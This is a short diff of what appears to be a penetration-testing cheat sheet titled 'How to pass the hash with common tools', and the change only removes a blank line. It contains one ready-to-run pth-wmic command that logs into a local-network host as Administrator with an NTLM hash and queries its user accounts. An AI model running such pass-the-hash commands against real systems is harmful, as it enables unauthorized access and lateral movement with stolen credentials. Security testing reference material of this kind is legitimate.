@@ -1,6 +1,5 @@
 # How to pass the hash with common tools
 
-
 # Execute WMI queries
 pth-wmic -U WORKGROUP/Administrator%aad3b435b51404eeaad3b435b51404ee:C0F2E311D3F450A7FF2571BB59FBEDE5 //192.168.1.25 "select Name from Win32_UserAccount"
 
